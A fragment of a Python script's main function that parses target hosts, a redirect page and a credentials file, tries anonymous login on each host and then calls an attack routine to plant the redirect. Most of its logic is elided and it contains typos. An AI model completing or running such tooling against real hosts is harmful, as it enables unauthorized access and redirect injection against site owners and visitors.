...
def main():
    parser = optparse.OptionParser('usage%prog -H <target hsot[s]> -r <redirect page> [-f <userlpass file>]')
    ...
    for tgtHost in tgtHosts:
        ...
        if anonLogin(tgtHost) == True:
            ...
            print('[+] Using Anonymous Creds to attaack')
            attack(username,passwd,tgtHost,redirect)
